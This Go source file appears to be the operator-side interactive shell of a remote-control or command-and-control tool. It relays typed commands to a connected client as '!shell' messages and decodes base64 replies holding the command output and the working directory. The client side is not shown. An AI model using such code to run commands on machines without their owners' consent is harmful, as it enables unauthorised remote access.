package main

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"strings"
)

const Delimiter string = "#+2%&"

type Shell struct {
	Client  *Client
	currDir string
	running bool
}

func NewShell(client *Client) *Shell {

	shell := Shell{
		Client:  client,
		running: false,
	}

	return &shell
}

// Starts a shell in a while loop. Can be exited with Ctrl + D or `exit` command.
func (shell *Shell) Start() error {
	reader := bufio.NewReader(os.Stdin)

	// initialize shell
	err := shell.Init()

	if err != nil {
		return err
	}

	shell.running = true

	for shell.running {
		shell.promt()

		in, err := reader.ReadString('\n')

		// Ctrl + D was pressed -> user wants to leave the shell
		if err != nil {
			shell.running = false
			fmt.Println()
		}

		out, err := shell.Exec(in)

		if err != nil {
			fmt.Println(err)
			continue
		}

		fmt.Print(string(out))
	}

	shell.Close()

	return nil
}

func (shell *Shell) Close() {
	shell.Client.Send("!closeshell\n")
}

// Finds out the current path on the client and sets it.
func (shell *Shell) Init() error {
	res, err := shell.Client.SendWithRes("!initshell\n")

	// client did not respond in time
	if err != nil {
		return err
	}

	decoded, err := base64.StdEncoding.DecodeString(res)

	// response of client is malformed
	if err != nil {
		return err
	}

	_, wd, err := seperateOutAndWd(string(decoded))

	// response of client is malformed
	if err != nil {
		return err
	}

	shell.currDir = wd

	return nil
}

func (shell *Shell) promt() {
	fmt.Printf("%s $ ", shell.pwd())
}

// Parses and tries to execute the raw string.
func (shell *Shell) Exec(raw string) ([]byte, error) {

	raw = strings.TrimSpace(raw)
	split := strings.Split(raw, " ")

	if len(raw) == 0 {
		return []byte{}, nil
	}

	program := split[0]

	if program == "pwd" {
		return []byte(shell.pwd()), nil
	} else if program == "exit" {
		shell.running = false
		return []byte{}, nil
	}

	// send to client and get response
	res, _ := shell.Client.SendWithRes(fmt.Sprintf("!shell %s\n", raw))

	decoded, err := base64.StdEncoding.DecodeString(res)

	if err != nil {
		return nil, errors.New("could not decode response")
	}

	out, wd, err := seperateOutAndWd(string(decoded))

	if err != nil {
		return nil, err
	}

	shell.currDir = wd

	return []byte(out), err
}

// Returns path to the current working directory.
func (shell *Shell) pwd() (pwd string) {
	return shell.currDir
}

// Seperates the output from the working directory and returns both.
func seperateOutAndWd(data string) (string, string, error) {

	split := strings.Split(data, Delimiter)

	if len(split) != 2 {
		return "", "", errors.New("could not seperate output from working directory")
	}

	return split[0], split[1], nil
}
